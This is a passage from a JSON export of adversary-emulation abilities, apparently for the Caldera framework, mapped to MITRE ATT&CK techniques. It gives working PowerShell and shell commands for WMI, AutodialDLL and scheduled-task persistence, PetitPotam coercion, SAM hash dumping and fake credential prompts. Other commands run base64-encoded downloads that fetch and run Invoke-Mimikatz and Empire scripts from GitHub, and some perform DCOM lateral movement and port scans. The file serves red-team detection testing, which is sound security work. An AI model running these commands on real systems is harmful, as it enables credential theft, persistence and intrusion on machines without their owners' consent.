"plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["mv -Force ~\\AppData\\Local\\Temp\\settings.json ~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json; taskkill /F /IM \"calculator.exe\" > $null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "mv ~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json ~\\AppData\\Local\\Temp\\settings.json; Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true\" -OutFile \"~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json\"; wt.exe", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Login Items", "ability_id": "01a2ad691dfb47b11d050fab371718d2", "technique_id": "T1547.015", "tactic": "multiple", "requirements": [], "name": "Persistence by modifying Windows Terminal profile", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer -Filter \"Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'\"; $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'\"; $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue; $FilterConsumerBindingToCleanup | Remove-WmiObject; $EventConsumerToCleanup | Remove-WmiObject; $EventFilterToCleanup | Remove-WmiObject"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';                 EventNameSpace='root\\CimV2';                 QueryLanguage=\"WQL\";                 Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"}; $Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments $FilterArgs; $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';                 ScriptingEngine='VBScript';                 ScriptText=';                 Set objws = CreateObject(\"Wscript.Shell\");                 objws.Run \"notepad.exe\", 0, True;                 '}; $Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs; $FilterToConsumerArgs = @{; Filter = $Filter; Consumer = $Consumer; }; $FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription", "ability_id": "4df4fdb269f34dd6d55969c83ff06c73", "technique_id": "T1546.003", "tactic": "multiple", "requirements": [], "name": "Persistence via WMI Event Subscription - ActiveScriptEventConsumer", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'\"; $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'\"; $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue; $FilterConsumerBindingToCleanup | Remove-WmiObject; $EventConsumerToCleanup | Remove-WmiObject; $EventFilterToCleanup | Remove-WmiObject"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';                 EventNameSpace='root\\CimV2';                 QueryLanguage=\"WQL\";                 Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"}; $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs; $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';                 CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}; $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs; $FilterToConsumerArgs = @{; Filter = [Ref] $Filter; Consumer = [Ref] $Consumer; }; $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription", "ability_id": "938a659c52ed102a8b35c7b1bb49eb11", "technique_id": "T1546.003", "tactic": "multiple", "requirements": [], "name": "Persistence via WMI Event Subscription - CommandLineEventConsumer", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this key to a DLL of their choice. \n\nThe sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing.\n[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value  $env:windir\\system32\\rasadhlp.dll"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (Test-Path PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll) { ; } else {New-Item -Type Directory \"PathToAtomicsFolder\\T1546\\bin\\\" -ErrorAction ignore | Out-Null; Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll\" -OutFile \"PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll\"};  ;  Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution", "ability_id": "2fc2b9c9b48990938653dbe8966d487d", "technique_id": "T1546", "tactic": "multiple", "requirements": [], "name": "Persistence with Custom AutodialDLL", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "& \"$env:TEMP\\PetitPotam.exe\" 10.0.0.3 10.0.0.2 1; Write-Host \"End of PetitPotam attack\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Forced Authentication", "ability_id": "74982b5ad2508dfeb87f03c47e89f0c6", "technique_id": "T1187", "tactic": "credential-access", "requirements": [], "name": "PetitPotam", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Ping the network in order to build the ARP cache", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "for ip in $(seq 190 199); do ping -c 1 $(echo #{domain.broadcast.ip} |\ncut -d. -f-3).$ip -W 1; done", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Network Configuration Discovery", "ability_id": "ac9dce33-2acc-4b34-94ce-2596409ce8f0", "technique_id": "T1016", "tactic": "discovery", "requirements": [], "name": "Ping network", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Scan ports to check for listening ports.\n\nUpon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/192.168.1.1/$port) && echo port $port is open ; done", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/192.168.1.1/$port) && echo port $port is open ; done", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Network Service Discovery", "ability_id": "62b88a98e32cac28c744db4fcad3a0dd", "technique_id": "T1046", "tactic": "discovery", "requirements": [], "name": "Port Scan", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Scan ports to check for listening ports for the local host 127.0.0.1", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "nmap 127.0.0.1", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Network Service Discovery", "ability_id": "d6d77e5399e89ad6557bd40defef7217", "technique_id": "T1046", "tactic": "discovery", "requirements": [], "name": "Port Scan NMap for Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Scan ports to check for listening ports with Nmap.\n\nUpon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of adresseses on port 80 to determine if listening. Results will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if [ -x \"$(command -v telnet)\" ]; then : ; else (which yum && yum -y install epel-release telnet)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet); fi; if [ -x \"$(command -v nc)\" ]; then : ; else (which yum && yum -y install epel-release nc)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat); fi; if [ -x \"$(command -v nmap)\" ]; then : ; else (which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap); fi;  ;  sudo nmap -sS 192.168.1.0/24 -p 80; telnet 192.168.1.1 80; nc -nv 192.168.1.1 80", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -x \"$(command -v telnet)\" ]; then : ; else (which yum && yum -y install epel-release telnet)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet); fi; if [ -x \"$(command -v nc)\" ]; then : ; else (which yum && yum -y install epel-release nc)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat); fi; if [ -x \"$(command -v nmap)\" ]; then : ; else (which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap); fi;  ;  sudo nmap -sS 192.168.1.0/24 -p 80; telnet 192.168.1.1 80; nc -nv 192.168.1.1 80", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Network Service Discovery", "ability_id": "d84a4fab3739f1dca177364e5c4b02a4", "technique_id": "T1046", "tactic": "discovery", "requirements": [], "name": "Port Scan Nmap", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Scan ports to check for listening ports with python\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["53b103_T1046.py"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "python 53b103_T1046.py -i 127.0.0.1", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Network Service Discovery", "ability_id": "518cee20267133203fc5d92cdc38af8c", "technique_id": "T1046", "tactic": "discovery", "requirements": [], "name": "Port Scan using python", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The Potentially Unwanted Applications (PUA) protection feature in antivirus software can identify and block PUAs from downloading and installing on endpoints in your network. These applications are not considered viruses, malware, or other types of threats, but might perform actions on endpoints that adversely affect their performance or use. This file is similar to EICAR test virus file, but is considered a Potentially Unwanted Application (PUA) instead of a VIRUS (i.e. not actually malicious, but is flagged as it to verify anti-pua protection).\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Stop-Process -name PotentiallyUnwanted; Remove-Item $env:TEMP/PotentiallyUnwanted.exe -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe; & \"$env:TEMP/PotentiallyUnwanted.exe\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "User Execution: Malicious File", "ability_id": "03a80d4a4c02d99295b5901ee695cc79", "technique_id": "T1204.002", "tactic": "execution", "requirements": [], "name": "Potentially Unwanted Applications (PUA)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes a hashdump by reading the hashes from the registry.", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (Test-Path \"$Env:Temp\\PowerDump.ps1\") { ; } else {Invoke-Webrequest -Uri \"https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1\" -UseBasicParsing -OutFile \"$Env:Temp\\PowerDump.ps1\"};  ;  Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green; Import-Module \"$Env:Temp\\PowerDump.ps1\"; Invoke-PowerDump", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: Security Account Manager", "ability_id": "25e524a8b1364858658ca0f6751da778", "technique_id": "T1003.002", "tactic": "credential-access", "requirements": [], "name": "PowerDump Hashes and Usernames from Registry", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.\n\nReference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName); write-warning $cred.GetNetworkCredential().Password", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Input Capture: GUI Input Capture", "ability_id": "6f5096d87a8f9ac4c397215cb58cc978", "technique_id": "T1056.002", "tactic": "multiple", "requirements": [], "name": "PowerShell - Prompt User for Password", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use of obfuscated PowerShell to execute an arbitrary command; outputs \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "2f5e819a0fdae54834fa85a0b797d302", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "PowerShell Command Execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test requires the manual installation of PowerShell V2.\n\nAttempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if(2 -in $PSVersionTable.PSCompatibleVersions.Major) { ; } else {Write-Host  Automated installer not implemented yet, please install PowerShell v2 manually};  ;  powershell.exe -version 2 -Command Write-Host $PSVersion", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "48a861eb5802bd7abdaa64b4fcd30924", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "PowerShell Downgrade Attack", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open \"C:\\Windows\\Temp\" and verify that\nart-marker.txt is in the folder.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -path C:\\Windows\\Temp\\art-marker.txt -Force -ErrorAction Ignore; Remove-Item HKCU:\\Software\\Classes\\AtomicRedTeam -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\"; iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "94bd4682c1c109fcc1d4011c3a616405", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "PowerShell Fileless Script Execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Powershell execution of known Malicious PowerShell Cmdlets", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$malcmdlets = \"Add-Persistence\", \"Find-AVSignature\", \"Get-GPPAutologon\", \"Get-GPPPassword\", \"Get-HttpStatus\", \"Get-Keystrokes\", \"Get-SecurityPackages\", \"Get-TimedScreenshot\", \"Get-VaultCredential\", \"Get-VolumeShadowCopy\", \"Install-SSP\", \"Invoke-CredentialInjection\", \"Invoke-DllInjection\", \"Invoke-Mimikatz\", \"Invoke-NinjaCopy\", \"Invoke-Portscan\", \"Invoke-ReflectivePEInjection\", \"Invoke-ReverseDnsLookup\", \"Invoke-Shellcode\", \"Invoke-TokenManipulation\", \"Invoke-WmiCommand\", \"Mount-VolumeShadowCopy\", \"New-ElevatedPersistenceOption\", \"New-UserPersistenceOption\", \"New-VolumeShadowCopy\", \"Out-CompressedDll\", \"Out-EncodedCommand\", \"Out-EncryptedScript\", \"Out-Minidump\", \"PowerUp\", \"PowerView\", \"Remove-Comments\", \"Remove-VolumeShadowCopy\", \"Set-CriticalProcess\", \"Set-MasterBootRecord\"; foreach ($cmdlets in $malcmdlets) {;     \"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\"}; foreach ($cmdlets in $malcmdlets) {;     $cmdlets}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "a9df2530a06e1aa7d1ba9e9309364b9f", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "PowerShell Invoke Known Malicious Cmdlets", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Download", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "ccdb8caf-c69e-424b-b930-551969450c57", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "PowerShell Invoke MimiKats", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"localhost\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Services: Distributed Component Object Model", "ability_id": "68df771632fd6216858edd20458ee5bb", "technique_id": "T1021.003", "tactic": "lateral-movement", "requirements": [], "name": "PowerShell Lateral Movement using MMC20", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. \nIt will first be created to spawn cmd.exe, but modified to run notepad.exe.\n\nUpon successful execution, powershell.exe will create a scheduled task and modify the action. \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Unregister-ScheduledTask -TaskName \"AtomicTaskModifed\" -confirm:$false >$null 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$Action = New-ScheduledTaskAction -Execute \"cmd.exe\"; $Trigger = New-ScheduledTaskTrigger -AtLogon; $User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set; Register-ScheduledTask AtomicTaskModifed -InputObject $object; $NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\"; Set-ScheduledTask \"AtomicTaskModifed\" -Action $NewAction", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Scheduled Task/Job: Scheduled Task", "ability_id": "4150ef18184112953ae5742a3f8de64e", "technique_id": "T1053.005", "tactic": "multiple", "requirements": [], "name": "PowerShell Modify A Scheduled Task", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Capture running processes via PowerShell", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log", "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "Process Discovery", "ability_id": "4d9b079c-9ede-4116-8b14-72ad3a5533af", "technique_id": "T1057", "tactic": "discovery", "requirements": [], "name": "PowerShell Process Enumeration", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "RunOnce Key Persistence via PowerShell\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce -Name \"NextRun\" -Force -ErrorAction Ignore"], "code": null, 